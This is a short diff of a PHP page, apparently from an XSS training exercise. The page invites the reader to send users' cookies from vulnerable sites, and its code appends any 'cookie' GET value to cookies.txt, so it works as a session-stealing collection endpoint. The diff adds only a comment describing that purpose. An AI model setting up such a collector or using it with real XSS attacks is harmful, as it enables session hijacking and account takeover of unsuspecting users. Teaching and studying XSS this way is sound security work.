@@ -10,6 +10,7 @@
 <p>Some sites have poor security and are vulnerable to XSS. Use this site to collect their users' cookies. 
 <br/>See if you can send a user's cookie using a GET request to this page using the GET field called 'cookie'.</p>
 <?php
+/* Grab sessionIDs out of URL and save them to a file. */
 if (isset($_GET['cookie']) && !isset($_POST['button'])) {
 	file_put_contents("cookies.txt", trim($_GET["cookie"]).PHP_EOL, FILE_APPEND);
 } 
